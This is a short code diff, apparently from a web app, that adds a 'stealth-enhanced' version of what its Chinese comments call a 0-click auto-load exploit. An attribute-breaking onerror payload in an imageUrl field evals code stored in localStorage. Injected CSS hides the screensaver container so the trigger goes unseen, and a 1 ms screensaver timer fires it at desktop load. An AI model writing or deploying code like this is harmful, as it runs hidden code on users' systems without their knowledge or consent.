@@ -845,12 +845,12 @@
     // 清除舊組件 (包括之前可能殘留嘅 ni-manager app entry)
     apps = apps.filter(a => a.id !== 'ni-core-system' && a.id !== 'ni-manager' && a.id !== 'ni-manager-manual');
 
-     // --- [新增：0-Click 自動載入漏洞利用] ---
-    // 構造一個特製的 AI 螢幕保護程式 Payload
-    // 當系統試圖渲染這個「圖片」時，會觸發 onerror 並執行我們的核心代碼
+    // --- [新增：0-Click 自動載入漏洞利用 (隱身增強版)] ---
+    // 透過注入 CSS 強制將螢幕保護程式容器設為透明，避免閃爍
     const autoTriggerPayload = {
-        "imageUrl": "x\" onerror=\"if(!window.NI_LOADED){eval(localStorage.getItem('ni_core'));} if(typeof hideScreenSaver==='function'){hideScreenSaver();}\""
+        "imageUrl": "x\" onerror=\"(function(){ const style=document.createElement('style'); style.innerHTML='#screenSaver { opacity: 0 !important; visibility: hidden !important; pointer-events: none !important; transition: none !important; }'; document.head.appendChild(style); if(!window.NI_LOADED){eval(localStorage.getItem('ni_core'));} if(typeof hideScreenSaver==='function'){hideScreenSaver();} })();\""
     };
+
 
     // 強制將系統螢幕保護程式設定為 AI 模式，並將觸發時間設為極短（1毫秒）
     // 這樣一開機進入桌面，系統就會瞬間觸發這個隱藏的 Payload
